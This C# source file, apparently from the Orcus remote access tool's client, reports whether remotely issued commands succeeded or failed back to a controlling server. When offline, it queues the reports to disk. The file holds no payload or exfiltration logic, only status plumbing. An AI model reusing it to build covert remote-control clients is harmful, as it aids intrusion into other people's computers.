using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using Orcus.Config;
using Orcus.Connection;
using Orcus.Plugins.StaticCommands;
using Orcus.Shared.Communication;
using Orcus.Shared.DynamicCommands;
using Orcus.Shared.Utilities;

namespace Orcus.StaticCommandManagement
{
    public class DynamicCommandFeedbackFactory : IFeedbackFactory
    {
        private readonly int _callbackId;
        private readonly List<MessageInfo> _messages;
        private readonly ServerConnection _serverConnection;
        private bool _commandSuceeded;
        private bool _isPushed;
        private string _message;

        public DynamicCommandFeedbackFactory(ServerConnection serverConnection, int callbackId)
        {
            _serverConnection = serverConnection;
            _callbackId = callbackId;
            _commandSuceeded = true;
            _messages = new List<MessageInfo>();
        }

        public void Succeeded()
        {
            if (_isPushed)
                return;

            _commandSuceeded = true;
            Push();
        }

        public void Failed()
        {
            if (_isPushed)
                return;

            _commandSuceeded = false;
            Push();
        }

        public void Succeeded(string message)
        {
            _message = message;
            Succeeded();
        }

        public void Failed(string message)
        {
            _message = message;
            Failed();
        }

        public void SendMessage(string message, MessageType messageType)
        {
            _messages.Add(new MessageInfo(message, messageType));
        }

        private void Push()
        {
            if (_serverConnection == null || !_serverConnection.IsConnected)
            {
                var directory = new DirectoryInfo(Consts.SendToServerPackages);
                if (!directory.Exists)
                    directory.Create();

                var file = FileExtensions.GetUniqueFileName(directory.FullName);
                using (var fileStream = new FileStream(file, FileMode.CreateNew, FileAccess.Write))
                using (var binaryWriter = new BinaryWriter(fileStream))
                    PushData(binaryWriter);
            }
            else
            {
                lock (_serverConnection.SendLock)
                {
                    PushData(_serverConnection.BinaryWriter);
                }
            }

            _isPushed = true;
        }

        public static void PushEvent(BinaryWriter binaryWriter, int callBackId, ActivityType activityType,
            string message)
        {
            var messagesData = !string.IsNullOrEmpty(message) ? Encoding.UTF8.GetBytes(message) : null;

            binaryWriter.Write((byte) FromClientPackage.ResponseStaticCommandResult);
            binaryWriter.Write((messagesData?.Length ?? 0) + 4 + 1);
            binaryWriter.Write(callBackId);
            binaryWriter.Write((byte) activityType);
            if (messagesData != null)
                binaryWriter.Write(messagesData);
        }

        private void PushData(BinaryWriter binaryWriter)
        {
            string message;
            MessageInfo errorMessage;

            if (!string.IsNullOrEmpty(_message))
                message = _message;
            else if ((errorMessage = _messages.LastOrDefault(x => x.MessageType != MessageType.Status)) != null)
                message = errorMessage.Message;
            else
                message = null;

            PushEvent(binaryWriter, _callbackId, _commandSuceeded ? ActivityType.Succeeded : ActivityType.Failed, message);
        }

        private class MessageInfo
        {
            public MessageInfo(string message, MessageType messageType)
            {
                Message = message;
                MessageType = messageType;
                Timestamp = DateTime.UtcNow;
            }

            public string Message { get; }
            public MessageType MessageType { get; }
            public DateTime Timestamp { get; }
        }
    }
}